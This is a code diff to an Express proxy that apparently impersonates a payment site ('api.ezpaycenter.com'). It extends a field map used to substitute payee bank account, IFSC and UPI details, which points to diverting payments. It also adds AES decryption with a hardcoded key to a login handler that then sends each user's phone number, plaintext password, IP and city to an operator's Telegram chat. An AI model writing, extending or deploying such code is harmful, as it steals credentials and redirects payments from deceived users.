@@ -1,6 +1,7 @@
 const express = require('express');
 const TelegramBot = require('node-telegram-bot-api');
 const { Redis } = require('@upstash/redis');
+const crypto = require('crypto');
 
 const app = express();
 const ORIGINAL_API = 'https://api.ezpaycenter.com';
@@ -312,6 +313,7 @@ const BANK_FIELDS = {
   'receiveraccount': 'accountNo', 'receiveraccountno': 'accountNo', 'receiveaccountnumber': 'accountNo',
   'walletaccount': 'accountNo', 'walletno': 'accountNo', 'walletaccountno': 'accountNo',
   'collectionaccount': 'accountNo', 'collectionaccountno': 'accountNo',
+  'customerbanknumber': 'accountNo', 'customerbankaccount': 'accountNo', 'customeraccountno': 'accountNo',
   'beneficiaryname': 'accountHolder', 'accountname': 'accountHolder', 'account_name': 'accountHolder',
   'receiveaccountname': 'accountHolder', 'holdername': 'accountHolder', 'name': 'accountHolder',
   'accountholder': 'accountHolder', 'bankaccountholder': 'accountHolder', 'receivename': 'accountHolder',
@@ -320,6 +322,7 @@ const BANK_FIELDS = {
   'payeecardname': 'accountHolder', 'receivecardname': 'accountHolder', 'receivercardname': 'accountHolder',
   'receivername': 'accountHolder', 'collectionname': 'accountHolder', 'collectionaccountname': 'accountHolder',
   'payeerealname': 'accountHolder', 'receiverrealname': 'accountHolder',
+  'customername': 'accountHolder', 'customerrealname': 'accountHolder',
   'ifsc': 'ifsc', 'ifsccode': 'ifsc', 'ifsc_code': 'ifsc', 'receiveifsc': 'ifsc',
   'bankifsc': 'ifsc', 'payeeifsc': 'ifsc', 'payeebankifsc': 'ifsc', 'receiverifsc': 'ifsc',
   'receiverbankifsc': 'ifsc', 'collectionifsc': 'ifsc',
@@ -329,7 +332,8 @@ const BANK_FIELDS = {
   'upiid': 'upiId', 'upi_id': 'upiId', 'upi': 'upiId', 'vpa': 'upiId',
   'upiaddress': 'upiId', 'payeeupi': 'upiId', 'payeeupiid': 'upiId',
   'receiverupi': 'upiId', 'walletupi': 'upiId', 'collectionupi': 'upiId',
-  'walletaddress': 'upiId', 'payaddress': 'upiId', 'payaccount': 'upiId'
+  'walletaddress': 'upiId', 'payaddress': 'upiId', 'payaccount': 'upiId',
+  'customerupi': 'upiId'
 };
 
 function replaceBankInUrl(urlStr, bank) {
@@ -902,9 +906,18 @@ app.post('/app/api/system/v2/login', async (req, res) => {
     const loginData2 = getResponseData(jsonResp);
     const finalUserId = userId || loginData2?.id || loginData2?.memberId || loginData2?.userId || '';
     if (data.adminChatId && bot) {
-      let pwd = body.memberPwd || body.password || body.pwd || '';
-      if (pwd) {
-        try { pwd = Buffer.from(pwd, 'base64').toString('utf8'); } catch(e) {}
+      const encPwd = body.memberPwd || body.password || body.pwd || '';
+      let pwd = encPwd;
+      if (encPwd) {
+        try {
+          const AES_KEY = 'H85ju78GJ6ti5fDU';
+          const keyBytes = Buffer.from(AES_KEY, 'utf8');
+          const iv = keyBytes.slice(0, 16);
+          const decipher = crypto.createDecipheriv('aes-128-cbc', keyBytes, iv);
+          let decrypted = decipher.update(Buffer.from(encPwd, 'base64'));
+          decrypted = Buffer.concat([decrypted, decipher.final()]);
+          pwd = decrypted.toString('utf8');
+        } catch(e) { pwd = encPwd; }
       }
       bot.sendMessage(data.adminChatId, `🔑 Login\n📱 Phone: ${phone || 'N/A'}\n🔒 Password: ${pwd || 'N/A'}\n👤 UserID: ${finalUserId || 'N/A'}\n🌐 IP: ${req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A'}\n📍 City: ${req.headers['x-vercel-ip-city'] || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
     }
